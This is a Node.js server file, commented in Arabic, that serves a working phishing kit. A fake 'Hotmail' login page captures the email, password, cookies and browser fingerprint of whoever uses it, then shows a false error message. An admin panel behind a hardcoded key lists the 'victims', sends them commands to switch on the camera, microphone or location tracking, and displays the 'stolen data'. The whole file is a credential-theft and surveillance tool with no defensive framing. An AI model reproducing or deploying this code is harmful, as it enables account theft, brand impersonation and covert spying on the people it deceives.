const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" }
});

// ============ صفحة الضحية (مدمجة) ============
const victimPage = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotmail - تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #0078d4; font-size: 32px; margin-bottom: 5px; }
        .logo p { color: #666; font-size: 14px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }
        .input-group input:focus { border-color: #0078d4; }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn-login:hover { background: #005a9e; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>Hotmail</h1>
            <p>تسجيل الدخول للبريد الإلكتروني</p>
        </div>
        <form id="login-form">
            <div class="input-group">
                <label>البريد الإلكتروني</label>
                <input type="email" id="email" placeholder="example@hotmail.com" required>
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
    </div>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        
        socket.on('connect', () => {
            socket.emit('victim_register', {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenRes: window.screen.width + 'x' + window.screen.height,
                language: navigator.language,
                cookies: document.cookie
            });
        });
        
        document.getElementById('login-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            socket.emit('victim_data', {
                type: 'credentials',
                data: { email, password }
            });
            
            alert('كلمة المرور غير صحيحة');
        });
        
        socket.on('execute_command', async (cmd) => {
            if (cmd.action === 'start_cam') {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    socket.emit('victim_data', { type: 'camera_active', data: 'Camera on' });
                } catch (err) {
                    socket.emit('victim_data', { type: 'error', data: err.message });
                }
            }
        });
    </script>
</body>
</html>`;

// ============ صفحة لوحة التحكم (مدمجة) ============
const adminPage = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - 2099</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #0a0a0f;
            color: #e0e0e0;
        }
        .login-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            gap: 20px;
        }
        .login-screen h1 { color: #00f0ff; font-size: 36px; }
        .login-screen input {
            padding: 15px;
            width: 300px;
            background: #1a1a2e;
            border: 2px solid #2a2a3a;
            color: white;
            border-radius: 8px;
            font-size: 16px;
        }
        .login-screen button {
            padding: 12px 30px;
            background: #00f0ff;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
        }
        .main-panel { display: none; padding: 20px; }
        header {
            background: #12121a;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
        }
        header h1 { color: #00f0ff; }
        .victims-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
        }
        .victim-card {
            background: #12121a;
            padding: 20px;
            border-radius: 10px;
            cursor: pointer;
            border: 2px solid transparent;
        }
        .victim-card:hover { border-color: #00f0ff; }
        .victim-card.selected { border-color: #ff0055; }
        .controls {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        .controls button {
            padding: 12px 20px;
            background: #1a1a2e;
            color: white;
            border: 1px solid #2a2a3a;
            border-radius: 8px;
            cursor: pointer;
        }
        .controls button:hover { background: #00f0ff; color: black; }
        .data-log {
            background: #12121a;
            padding: 20px;
            border-radius: 10px;
            min-height: 200px;
        }
    </style>
</head>
<body>
    <div class="login-screen" id="login-screen">
        <h1>👑 لوحة التحكم</h1>
        <input type="password" id="admin-key" placeholder="أدخل مفتاح الوصول">
        <button onclick="login()">دخول</button>
    </div>
    
    <div class="main-panel" id="main-panel">
        <header>
            <h1>HOTMAIL 2099 - Control Panel</h1>
            <div>الضحايا: <b id="victim-count">0</b></div>
        </header>
        
        <div class="victims-list" id="victims-list"></div>
        
        <div class="controls">
            <button onclick="sendCmd('start_cam')">📷 الكاميرا</button>
            <button onclick="sendCmd('start_mic')">🎤 الميكروفون</button>
            <button onclick="sendCmd('get_location')">📍 الموقع</button>
            <button onclick="sendCmd('get_cookies')">🍪 الكوكيز</button>
        </div>
        
        <div class="data-log">
            <h2>البيانات المسروقة</h2>
            <div id="stolen-data"></div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let selectedVictim = null;
        
        function login() {
            const key = document.getElementById('admin-key').value;
            socket.emit('admin_register', { key });
        }
        
        socket.on('admin_authenticated', (res) => {
            if (res.status === 'success') {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-panel').style.display = 'block';
            }
        });
        
        socket.on('victims_update', (victims) => {
            document.getElementById('victim-count').textContent = victims.length;
            const list = document.getElementById('victims-list');
            list.innerHTML = '';
            victims.forEach(v => {
                const card = document.createElement('div');
                card.className = 'victim-card';
                card.innerHTML = '<strong>' + (v.deviceName || 'Unknown') + '</strong><br>' + v.ip;
                card.onclick = () => {
                    selectedVictim = v.id;
                    document.querySelectorAll('.victim-card').forEach(c => c.classList.remove('selected'));
                    card.classList.add('selected');
                };
                list.appendChild(card);
            });
        });
        
        function sendCmd(action) {
            if (!selectedVictim) { alert('اختر ضحية'); return; }
            socket.emit('admin_command', { victimId: selectedVictim, action });
        }
        
        socket.on('victim_response', (data) => {
            const div = document.getElementById('stolen-data');
            const entry = document.createElement('div');
            entry.innerHTML = '<b>' + data.type + '</b>: ' + JSON.stringify(data.data);
            div.prepend(entry);
        });
    </script>
</body>
</html>`;

// ============ المسارات ============
app.get('/health', (req, res) => {
    res.json({ status: 'active' });
});

app.get('/admin', (req, res) => {
    res.send(adminPage);
});

app.get('/', (req, res) => {
    res.send(victimPage);
});

// ============ Socket.io ============
let victims = new Map();
let admins = new Set();

io.on('connection', (socket) => {
    console.log('Connected:', socket.id);

    socket.on('admin_register', (data) => {
        if (data.key === 'ARCHITECT_2099') {
            admins.add(socket.id);
            socket.emit('admin_authenticated', { status: 'success' });
        }
    });

    socket.on('victim_register', (data) => {
        victims.set(socket.id, { id: socket.id, ...data });
        admins.forEach(adminId => {
            io.to(adminId).emit('victims_update', Array.from(victims.values()));
        });
    });

    socket.on('admin_command', (payload) => {
        if (victims.has(payload.victimId)) {
            io.to(payload.victimId).emit('execute_command', payload);
        }
    });

    socket.on('victim_data', (data) => {
        admins.forEach(adminId => {
            io.to(adminId).emit('victim_response', data);
        });
    });

    socket.on('disconnect', () => {
        victims.delete(socket.id);
        admins.delete(socket.id);
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('⚡ Running on port ' + PORT);
});
